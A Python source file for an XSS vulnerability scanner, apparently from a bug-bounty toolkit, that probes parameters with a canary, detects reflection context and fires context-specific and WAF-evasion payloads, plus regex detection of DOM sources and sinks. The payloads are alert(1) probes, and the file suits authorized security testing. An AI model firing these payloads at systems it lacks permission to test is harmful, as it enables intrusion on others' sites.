"""
XSS (Cross-Site Scripting) Scanner (v2 – Intelligence Upgrade)
===============================================================

Tests for:
- Reflected XSS (with context-aware payload selection)
- DOM-based XSS detection patterns
- WAF-aware evasion via PayloadEngine integration
- HTML/JS/attribute context detection for precision payloads
- Encoding bypass attempts
- Response reflection analysis
"""

from __future__ import annotations

import asyncio
import html
import re
from typing import Any
from urllib.parse import urlencode, urlparse, parse_qs, urlunparse

from bbhunter.engines.scanner.base_scanner import BaseScanner
from bbhunter.logger import get_logger
from bbhunter.models import Endpoint, Severity, Vulnerability, VulnCategory

logger = get_logger()


class XSSScanner(BaseScanner):
    """Cross-Site Scripting vulnerability scanner with context-aware intelligence."""

    CATEGORY = VulnCategory.XSS

    # ── Canary for initial reflection check ──
    CANARY = "bbh7x3r"  # Unique string to detect reflection without triggering WAFs

    # ── Context-specific payloads ──
    # Organized by the HTML context where reflection occurs
    CONTEXT_PAYLOADS: dict[str, list[str]] = {
        "html_body": [
            '<img src=x onerror=alert(1)>',
            '<svg/onload=alert(1)>',
            '<details/open/ontoggle=alert(1)>',
            '<math><mi//xlink:href="data:x,<script>alert(1)</script>">',
            '<input autofocus onfocus=alert(1)>',
        ],
        "html_attribute": [
            '" onfocus="alert(1)" autofocus="',
            "' onfocus='alert(1)' autofocus='",
            '" onmouseover="alert(1)" x="',
            '"><img src=x onerror=alert(1)>',
            "' onclick='alert(1)' x='",
        ],
        "javascript": [
            "'-alert(1)-'",
            '";alert(1)//',
            "\\';alert(1)//",
            "</script><script>alert(1)</script>",
            "`-alert(1)-`",
        ],
        "url_context": [
            "javascript:alert(1)",
            "data:text/html,<script>alert(1)</script>",
            "javascript:alert(1)//",
        ],
        "template": [
            "{{constructor.constructor('alert(1)')()}}",
            "${alert(1)}",
            "#{alert(1)}",
            "<%= alert(1) %>",
        ],
    }

    # ── Fallback universal payloads (when context can't be determined) ──
    UNIVERSAL_PAYLOADS = [
        '<script>alert(1)</script>',
        '"><script>alert(1)</script>',
        "'-alert(1)-'",
        '<img src=x onerror=alert(1)>',
        '<svg/onload=alert(1)>',
        '"><img src=x onerror=alert(1)>',
        '" onfocus="alert(1)" autofocus="',
        '{{constructor.constructor("alert(1)")()}}',
        '<ScRiPt>alert(1)</ScRiPt>',
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
        '<img src=x onerror=alert`1`>',
        '%00<script>alert(1)</script>',
    ]

    # ── DOM-based XSS sink patterns ──
    DOM_SINKS = [
        r'\.innerHTML\s*=',
        r'\.outerHTML\s*=',
        r'document\.write\s*\(',
        r'document\.writeln\s*\(',
        r'eval\s*\(',
        r'setTimeout\s*\(\s*["\']',
        r'setInterval\s*\(\s*["\']',
        r'\.insertAdjacentHTML\s*\(',
        r'\.src\s*=\s*[^"\']*(?:location|document\.URL|document\.referrer)',
        r'\.href\s*=\s*[^"\']*(?:location|document\.URL)',
        r'jQuery\s*\(\s*(?:location|document)',
        r'\$\s*\(\s*(?:location|document)',
    ]

    # ── DOM-based XSS source patterns ──
    DOM_SOURCES = [
        r'location\.(?:hash|search|href|pathname)',
        r'document\.(?:URL|referrer|cookie|domain)',
        r'window\.(?:name|location)',
        r'document\.getElementById.*\.value',
        r'URLSearchParams',
    ]

    # Patterns confirming XSS execution
    REFLECTION_PATTERNS = [
        r'<script>alert\(["\']?(?:XSS|1)["\']?\)</script>',
        r'onerror\s*=\s*alert',
        r'onload\s*=\s*alert',
        r'onfocus\s*=\s*alert',
        r'onmouseover\s*=\s*alert',
        r'onclick\s*=\s*alert',
        r'ontoggle\s*=\s*alert',
        r'<svg/onload=alert',
        r'<img\s+src=x\s+onerror=alert',
        r'javascript:\s*alert',
    ]

    def __init__(self):
        super().__init__()
        self._payload_engine: Any = None
        self._learning_engine: Any = None

    def set_payload_engine(self, engine: Any):
        """Inject PayloadEngine for WAF-aware payload generation."""
        self._payload_engine = engine

    def set_learning_engine(self, engine: Any):
        """Inject LearningEngine for effectiveness tracking."""
        self._learning_engine = engine

    async def scan(
        self,
        endpoints: list[Endpoint],
        target_id: str,
        scan_id: str,
    ) -> list[Vulnerability]:
        """Scan endpoints for XSS vulnerabilities with intelligent payload selection."""
        vulnerabilities: list[Vulnerability] = []

        for endpoint in endpoints:
            # Test each parameter
            for param in endpoint.parameters:
                vulns = await self._test_parameter(endpoint, param.name, target_id, scan_id)
                vulnerabilities.extend(vulns)

            # Check for DOM-based XSS patterns in response body
            dom_vulns = await self._check_dom_xss(endpoint, target_id, scan_id)
            vulnerabilities.extend(dom_vulns)

        return vulnerabilities

    async def _test_parameter(
        self,
        endpoint: Endpoint,
        param_name: str,
        target_id: str,
        scan_id: str,
    ) -> list[Vulnerability]:
        """Test a specific parameter for XSS with context detection."""
        vulns: list[Vulnerability] = []
        parsed = urlparse(endpoint.url)

        # Step 1: Send canary to detect reflection and determine context
        canary_value = f"{self.CANARY}{param_name[:4]}"
        params = parse_qs(parsed.query)
        params[param_name] = [canary_value]
        test_query = urlencode(params, doseq=True)
        test_url = urlunparse(parsed._replace(query=test_query))

        resp = await self._send_request(test_url)
        if resp is None:
            return vulns

        body = resp.text
        if canary_value not in body:
            return vulns  # Parameter value is not reflected — skip

        # Step 2: Detect reflection context
        context = self._detect_context(body, canary_value)
        logger.debug(f"XSS context for {param_name}@{endpoint.url}: {context}")

        # Step 3: Select payloads based on context
        payloads = self._select_payloads(context, endpoint)

        # Step 4: Test payloads
        for payload in payloads[:self.config.scanner.max_payloads_per_param]:
            params[param_name] = [payload]
            test_query = urlencode(params, doseq=True)
            test_url = urlunparse(parsed._replace(query=test_query))

            resp = await self._send_request(test_url)
            if resp is None:
                continue

            body = resp.text
            reflected = payload in body

            # Check for reflected payload or pattern match
            confidence = 0.0
            if reflected:
                confidence = self._calculate_confidence(payload, body, context)
            else:
                # Check if payload triggered but was slightly modified
                for pattern in self.REFLECTION_PATTERNS:
                    if re.search(pattern, body, re.IGNORECASE):
                        confidence = 0.6
                        break

            if confidence > 0.5:
                severity = Severity.HIGH if confidence > 0.7 else Severity.MEDIUM
                vuln = self._create_vulnerability(
                    target_id=target_id,
                    scan_id=scan_id,
                    title=f"Reflected XSS in '{param_name}' ({context} context)",
                    severity=severity,
                    url=endpoint.url,
                    parameter=param_name,
                    payload=payload,
                    evidence=self._extract_evidence(body, payload),
                    description=(
                        f"The parameter '{param_name}' reflects user input in a {context} context "
                        f"without proper sanitization, enabling Cross-Site Scripting (XSS). "
                        f"Confidence: {confidence:.0%}."
                    ),
                    impact=(
                        "An attacker can execute arbitrary JavaScript in the victim's browser, "
                        "potentially leading to session hijacking, credential theft, keylogging, "
                        "phishing, or malicious redirects."
                    ),
                    remediation=(
                        f"Apply context-appropriate output encoding for {context} context. "
                        "Implement Content-Security-Policy with nonce-based script allowlisting. "
                        "Use a templating engine with auto-escaping enabled."
                    ),
                    confidence=confidence,
                    request=f"GET {test_url}",
                    response=f"HTTP {resp.status_code}\n{body[:500]}",
                    steps=[
                        f"Navigate to: {test_url}",
                        f"The payload '{payload}' is reflected in the {context} context",
                        "JavaScript executes in the browser",
                    ],
                )
                vulns.append(vuln)

                # Record result in learning engine
                if self._learning_engine:
                    try:
                        self._learning_engine.record_payload_result(
                            payload=payload,
                            category="xss",
                            success=True,
                            waf=None,  # Could be detected from _payload_engine
                            context={"param": param_name, "context": context},
                        )
                    except Exception as exc:
                        logger.debug(f"Payload feedback recording failed: {exc}")

                break  # One confirmed XSS per param is enough

        return vulns

    async def _check_dom_xss(
        self,
        endpoint: Endpoint,
        target_id: str,
        scan_id: str,
    ) -> list[Vulnerability]:
        """Check response body for DOM-based XSS patterns."""
        vulns: list[Vulnerability] = []

        resp = await self._send_request(endpoint.url)
        if resp is None:
            return vulns

        body = resp.text

        # Look for source → sink patterns
        found_sources: list[str] = []
        found_sinks: list[str] = []

        for pattern in self.DOM_SOURCES:
            matches = re.findall(pattern, body)
            found_sources.extend(matches)

        for pattern in self.DOM_SINKS:
            matches = re.findall(pattern, body)
            found_sinks.extend(matches)

        if found_sources and found_sinks:
            evidence_parts = []
            if found_sinks:
                evidence_parts.append(f"Sinks: {', '.join(found_sinks[:3])}")
            if found_sources:
                evidence_parts.append(f"Sources: {', '.join(found_sources[:3])}")

            vuln = self._create_vulnerability(
                target_id=target_id,
                scan_id=scan_id,
                title=f"Potential DOM-based XSS at {urlparse(endpoint.url).path}",
                severity=Severity.MEDIUM,
                url=endpoint.url,
                evidence=" | ".join(evidence_parts),
                description=(
                    f"The page contains DOM XSS source patterns ({len(found_sources)} sources) "
                    f"and sink patterns ({len(found_sinks)} sinks) that may allow DOM-based XSS. "
                    "Manual verification required."
                ),
                impact=(
                    "DOM-based XSS executes entirely client-side and may bypass server-side "
                    "WAF/filter protections. Exploitation can lead to session theft or phishing."
                ),
                remediation=(
                    "Avoid using dangerous DOM sinks (innerHTML, document.write, eval). "
                    "Use textContent instead of innerHTML. Sanitize DOM sources before use."
                ),
                confidence=0.4,
                steps=[
                    f"Open {endpoint.url} in a browser",
                    "Open DevTools → Sources, search for identified sinks",
                    "Test if user-controlled input reaches sinks via fragment (#) or query parameters",
                ],
            )
            vulns.append(vuln)

        return vulns

    def _detect_context(self, body: str, canary: str) -> str:
        """Detect the HTML/JS context where the canary is reflected."""
        idx = body.find(canary)
        if idx == -1:
            return "unknown"

        # Get surrounding context (200 chars before and after)
        before = body[max(0, idx - 200):idx]
        after = body[idx + len(canary):idx + len(canary) + 200]

        # Check if inside a <script> block
        last_script_open = before.rfind("<script")
        last_script_close = before.rfind("</script")
        if last_script_open > last_script_close:
            return "javascript"

        # Check if inside an HTML attribute
        # Look for pattern: attribute="...CANARY..."
        attr_pattern = re.search(r'[\w-]+\s*=\s*["\'][^"\']*$', before)
        if attr_pattern:
            # Check if it's a URL attribute (href, src, action)
            attr_match = re.search(r'(href|src|action|formaction|data|poster)\s*=\s*["\'][^"\']*$',
                                   before, re.IGNORECASE)
            if attr_match:
                return "url_context"
            return "html_attribute"

        # Check if inside a template expression
        if re.search(r'\{\{[^}]*$', before) or re.search(r'\$\{[^}]*$', before):
            return "template"

        # Check if inside HTML comment
        last_comment_open = before.rfind("<!--")
        last_comment_close = before.rfind("-->")
        if last_comment_open > last_comment_close:
            return "html_comment"

        # Default: HTML body
        return "html_body"

    def _select_payloads(self, context: str, endpoint: Endpoint) -> list[str]:
        """Select payloads based on detected context and available engines."""
        payloads: list[str] = []

        # Try PayloadEngine for ranked payloads
        if self._payload_engine:
            try:
                generated = self._payload_engine.generate(category="xss", target_url=endpoint.url)
                if generated:
                    payloads.extend(generated[:4])
            except Exception as exc:
                logger.debug(f"Payload generation failed: {exc}")

        # Add context-specific payloads
        context_specific = self.CONTEXT_PAYLOADS.get(context, [])
        payloads.extend(context_specific)

        # Add universal payloads as fallback
        payloads.extend(self.UNIVERSAL_PAYLOADS)

        # Deduplicate while preserving order
        seen = set()
        unique: list[str] = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)

        return unique

    def _calculate_confidence(self, payload: str, body: str, context: str = "unknown") -> float:
        """Calculate confidence that the reflection is exploitable XSS."""
        confidence = 0.3

        # Context-aware confidence
        if context == "javascript":
            # In JS context, even partial injection is dangerous
            if payload in body:
                confidence = 0.9
        elif context == "html_attribute":
            if f'="{payload}"' in body or f"='{payload}'" in body:
                confidence = 0.85
            elif payload in body and ('"' in payload or "'" in payload):
                confidence = 0.8
        elif context == "html_body":
            # Check if payload is inside script tags
            if f"<script>{payload}" in body or f"{payload}</script>" in body:
                confidence = 0.95
            elif f">{payload}<" in body:
                confidence = 0.8
            elif payload in body:
                confidence = 0.7

        # Event handler execution is very high confidence
        if re.search(r'on\w+=\s*(?:alert|confirm|prompt)', body, re.IGNORECASE):
            confidence = max(confidence, 0.9)

        # Check for any execution pattern
        for pattern in self.REFLECTION_PATTERNS:
            if re.search(pattern, body, re.IGNORECASE):
                confidence = max(confidence, 0.85)

        # Penalty: payload is HTML-encoded (safe output)
        escaped = html.escape(payload)
        if escaped in body and payload not in body:
            confidence = 0.1

        # Penalty: payload is inside a comment
        comment_pattern = re.compile(r'<!--.*?' + re.escape(payload) + r'.*?-->', re.DOTALL)
        if comment_pattern.search(body):
            confidence = min(confidence, 0.2)

        return confidence

    def _extract_evidence(self, body: str, payload: str, context_size: int = 150) -> str:
        """Extract the surrounding context where the payload was reflected."""
        idx = body.find(payload)
        if idx == -1:
            return ""
        start = max(0, idx - context_size)
        end = min(len(body), idx + len(payload) + context_size)
        return f"...{body[start:end]}..."
